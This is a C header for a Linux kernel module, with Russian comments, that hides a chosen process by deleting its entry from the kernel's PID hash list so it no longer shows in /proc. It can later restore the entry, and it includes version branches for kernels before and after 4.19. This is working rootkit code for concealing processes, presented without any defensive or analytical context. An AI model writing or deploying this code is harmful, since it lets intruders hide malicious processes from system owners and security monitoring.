#ifndef _HIDE_PROCESS_H
#define _HIDE_PROCESS_H

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/list.h>
#include <linux/version.h>

// Объявляем task как extern, так как он определен в entry.c
extern struct task_struct *task;

static inline void hide_process(struct task_struct *task, int *state)
{
    if (!task) return;

    // Начиная с ядра 5.10 GKI, структура task_struct может быть непрозрачной для модулей
    // или иметь рандомизированные смещения. Но pid_links обычно доступны.
    
    #if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 19, 0)
        // Для ядер 4.19+ (включая 5.10)
        // Удаляем из списка PID, чтобы процесс не был виден в /proc
        if (!hlist_unhashed(&task->pid_links[PIDTYPE_PID])) {
            hlist_del_init(&task->pid_links[PIDTYPE_PID]);
            *state = 1;
        }
    #else
        // Для старых ядер
        if (!hlist_unhashed(&task->pids[PIDTYPE_PID].node)) {
            hlist_del_init(&task->pids[PIDTYPE_PID].node);
            *state = 1;
        }
    #endif
}

static inline void hide_pid_process(struct task_struct *task)
{
    if (!task) return;

    #if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 19, 0)
        if (!hlist_unhashed(&task->pid_links[PIDTYPE_PID])) {
            hlist_del_init(&task->pid_links[PIDTYPE_PID]);
        }
    #else
        if (!hlist_unhashed(&task->pids[PIDTYPE_PID].node)) {
            hlist_del_init(&task->pids[PIDTYPE_PID].node);
        }
    #endif
}

static inline void recover_process(struct task_struct *task)
{
    if (!task) return;

    // Восстановление требует доступа к pid_task или thread_pid
    // Внимание: если pid структура была освобождена, это приведет к панике
    // Поэтому используем RCU

    rcu_read_lock();
    #if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 19, 0)
        if (hlist_unhashed(&task->pid_links[PIDTYPE_PID]) && task->thread_pid) {
            hlist_add_head_rcu(&task->pid_links[PIDTYPE_PID], &task->thread_pid->tasks[PIDTYPE_PID]);
        }
    #else
        if (hlist_unhashed(&task->pids[PIDTYPE_PID].node) && task->pids[PIDTYPE_PID].pid) {
            hlist_add_head_rcu(&task->pids[PIDTYPE_PID].node, &task->pids[PIDTYPE_PID].pid->tasks[PIDTYPE_PID]);
        }
    #endif
    rcu_read_unlock();
}

#endif // _HIDE_PROCESS_H
